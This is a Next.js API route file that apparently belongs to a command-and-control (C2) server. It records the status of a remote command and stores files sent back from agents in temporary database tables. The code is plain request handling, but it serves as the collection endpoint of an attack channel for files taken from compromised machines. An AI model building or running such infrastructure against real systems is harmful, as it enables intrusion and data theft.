// app/api/c2/commands/[id]/result/route.ts
import { NextRequest, NextResponse } from 'next/server'
import sql from '@/lib/db'

export async function POST(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  try {
    const commandId = Number(params.id)
    if (isNaN(commandId)) {
      return NextResponse.json({ error: 'Invalid command ID' }, { status: 400 })
    }

    const { status, output, files } = await req.json()
    
    // Update command status
    await sql`
      UPDATE c2_commands_temp
      SET status = ${status || 'completed'}
      WHERE id = ${commandId}
    `
    
    // Store files temporarily if needed
    if (files && files.length > 0) {
      for (const file of files) {
        await sql`
          INSERT INTO c2_files_temp (command_id, filename, data, size, mime_type, created_at)
          VALUES (
            ${commandId}, 
            ${file.name || 'unknown'}, 
            ${file.data || ''}, 
            ${file.size || 0}, 
            ${file.type || 'application/octet-stream'},
            NOW()
          )
        `
      }
    }
    
    return NextResponse.json({ 
      received: true,
      commandId,
      status 
    })
  } catch (error) {
    console.error('Error saving command result:', error)
    return NextResponse.json({ error: 'Failed to save result' }, { status: 500 })
  }
}